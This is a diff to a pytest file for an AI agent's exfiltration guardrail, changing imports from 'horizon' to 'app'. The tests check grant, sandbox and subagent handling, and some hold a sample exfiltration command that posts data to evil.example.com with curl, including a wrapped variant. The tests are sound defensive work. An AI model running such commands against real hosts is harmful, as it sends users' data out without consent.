@@ -20,12 +20,12 @@ from types import SimpleNamespace
 
 import pytest
 
-from horizon.guardrails.exfil_config import (
+from app.guardrails.exfil_config import (
     default_config,
     host_allowed,
     load_exfil_config,
 )
-from horizon.guardrails.exfil_guard import evaluate_exfil, exfil_guard
+from app.guardrails.exfil_guard import evaluate_exfil, exfil_guard
 
 CFG = default_config()
 
@@ -111,7 +111,7 @@ def test_benign_command_is_allowed():
 
 @pytest.mark.asyncio
 async def test_session_grant_bypasses_block():
-    from horizon.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
+    from app.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
 
     cmd = "curl -d x=1 https://evil.example.com"
     state = {
@@ -130,7 +130,7 @@ async def test_session_grant_bypasses_block():
 @pytest.mark.asyncio
 async def test_loose_grant_clears_rewrapped_host_block():
     # Grant the bare command; the model retries it wrapped — still cleared.
-    from horizon.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
+    from app.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
 
     granted = "curl -d x=1 https://evil.example.com"
     wrapped = f"cd ~/.local && {granted} && echo done"
@@ -150,7 +150,7 @@ async def test_loose_grant_clears_rewrapped_host_block():
 @pytest.mark.asyncio
 async def test_loose_grant_cannot_clear_secret_material_block():
     # A loose (substring) grant must NOT smuggle a literal secret past the block.
-    from horizon.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
+    from app.guardrails.policy_grants import POLICY_GRANTS_STATE_KEY
 
     state = {
         POLICY_GRANTS_STATE_KEY: [
@@ -206,7 +206,7 @@ class _FakeSandboxEnv:
 async def test_sandbox_overlay_extends_hosts_via_interface(tmp_path):
     # Under the sandbox backend the overlay is reached through the env interface, not
     # the host fs — a tenant allow_hosts entry must still reach the argument guard.
-    from horizon.guardrails.exfil_config import load_exfil_config_for_env
+    from app.guardrails.exfil_config import load_exfil_config_for_env
 
     env = _FakeSandboxEnv(tmp_path / "sbx")
     env.put(
@@ -227,7 +227,7 @@ async def test_sandbox_overlay_extends_hosts_via_interface(tmp_path):
 
 @pytest.mark.asyncio
 async def test_subagents_are_covered_via_child_guard():
-    from horizon.subagents.child_guard import make_child_policy_guard
+    from app.subagents.child_guard import make_child_policy_guard
 
     guard = make_child_policy_guard(parent_grants=None, profile=None)
     res = await guard(
@@ -240,8 +240,8 @@ async def test_subagents_are_covered_via_child_guard():
 
 @pytest.mark.asyncio
 async def test_child_profile_deny_precedes_exfil():
-    from horizon.subagents.child_guard import make_child_policy_guard
-    from horizon.subagents.profiles import get_profile
+    from app.subagents.child_guard import make_child_policy_guard
+    from app.subagents.profiles import get_profile
 
     guard = make_child_policy_guard(
         parent_grants=None, profile=get_profile("explore")
@@ -522,8 +522,8 @@ def test_env_test_variants_blocked_but_example_passes():
 def test_layer_a_blocks_without_egress_env(monkeypatch):
     # Layer A must stand alone with no Layer-B egress mode set.
     monkeypatch.delenv("LHA_EGRESS_ALLOWLIST_MODE", raising=False)
-    from horizon.guardrails.exfil_config import default_config
-    from horizon.guardrails.exfil_guard import evaluate_exfil
+    from app.guardrails.exfil_config import default_config
+    from app.guardrails.exfil_guard import evaluate_exfil
 
     cfg = default_config()
     # literal secret in args → hard block
